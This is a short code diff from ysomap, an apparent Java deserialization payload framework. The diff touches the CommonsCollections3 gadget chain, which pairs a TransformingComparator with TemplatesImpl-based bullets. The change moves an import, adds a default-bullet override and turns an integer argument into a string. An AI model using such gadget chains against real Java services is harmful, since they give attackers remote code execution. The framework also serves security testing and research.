@@ -4,7 +4,7 @@ import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
-import ysomap.PayloadTester;
+import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
 import ysomap.gadget.ObjectGadget;
@@ -40,8 +40,13 @@ public class CommonsCollections3 extends CommonsCollections2 {
         return queue;
     }
 
+    @Override
+    public ObjectGadget getDefaultBullet(String command) {
+        return new TransformerWithTemplatesImplBullet(null, "4");
+    }
+
     public static void main(String[] args) {
-        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, 4);
+        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "4");
         new PayloadTester(CommonsCollections3.class)
                 .setBullet(bullet)
                 .run();
